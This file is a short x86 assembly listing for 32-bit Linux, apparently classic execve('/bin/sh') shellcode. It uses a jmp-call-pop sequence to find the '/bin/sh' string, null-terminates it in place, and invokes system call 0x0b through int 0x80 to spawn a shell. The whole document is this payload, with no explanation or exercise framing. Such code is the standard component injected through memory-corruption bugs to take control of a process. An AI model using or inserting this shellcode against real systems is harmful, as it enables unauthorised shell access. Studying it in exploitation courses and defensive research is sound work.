	[BITS 32]

	global _start


_start:

	jmp getit
main:
	xor eax,eax
	xor ecx,ecx
	xor edx,edx
	pop ebx
	mov [ebx+7],eax

	mov al,0x0b
	int 0x80

getit:
	call main
	db "/bin/sh"
	
